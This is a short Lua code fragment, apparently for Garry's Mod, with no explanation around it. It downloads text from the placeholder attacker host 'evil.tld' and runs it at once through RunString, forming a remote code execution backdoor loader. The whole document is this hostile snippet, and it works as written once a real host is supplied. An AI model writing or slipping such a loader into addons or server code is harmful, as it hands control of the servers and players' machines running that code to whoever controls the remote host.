http.Fetch("http://evil.tld/payload",
    function(body, len, headers, code)
        local f = body
        RunString(f)
    end)
